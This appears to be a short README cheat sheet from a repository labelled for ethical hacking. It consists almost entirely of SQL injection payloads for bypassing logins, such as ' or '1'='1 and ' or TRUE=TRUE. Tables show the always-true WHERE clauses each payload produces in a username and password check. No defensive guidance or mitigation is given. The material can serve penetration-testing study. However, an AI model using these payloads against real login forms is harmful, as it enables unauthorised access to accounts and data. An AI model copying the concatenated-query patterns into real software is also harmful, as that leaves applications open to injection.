# SQL INJECTION 
### PAYLOAD AND EXAMPLE QUERY

![https://img.shields.io/badge/ETHICAL%20HACKING-TRUE-red](https://img.shields.io/badge/ETHICAL%20HACKING-TRUE-red)

> ! Attention, This Repository For Ethical Hacking 

### 1. Bypass SQL Always True 

Example of QUERY SQL starting from WHERE, please develop and analyze it yourself.

> Based on 1=1 is Always True 

| NO|PAYLOAD  | EXAMPLE QUERY |
|--|--|--|
|1| ```' or '1'='1``` |```WHERE username = '' or '1'='1' AND password = '' or '1'='1';```|
|2| ```' or 1=1``` |```WHERE username = '' or 1=1 AND password = '' or 1=1;```|
| | |```WHERE name  = '' or 1=1;```|
|3 | ```or 1=1``` |```WHERE id = 1 or 1=1;```|
| | |```WHERE id = NULL or 1=1;```|

> Based on Field Name not null is Always True

Use the Field name for payload

|NO|PAYLOAD  | EXAMPLE QUERY |
|--|--|--|
|1| ```' or username!=''``` |```WHERE username = '' or username!='' AND password = '' or password!='';```|
| | |```WHERE country_id = '' or country_id != '';```|;
> Based on FALSE Not TRUE is Always True

|NO|PAYLOAD  | EXAMPLE QUERY |
|--|--|--|
|1| ```' or FALSE!=TRUE``` |```WHERE username = '' or FALSE!=TRUE AND password = '' or FALSE!=TRUE;```|

> Based on TRUE=TRUE is Always True

|NO|PAYLOAD  | EXAMPLE QUERY |
|--|--|--|
|1| ```' or TRUE=TRUE``` |```WHERE username = '' or TRUE=TRUE AND password = '' or TRUE=TRUE;```|

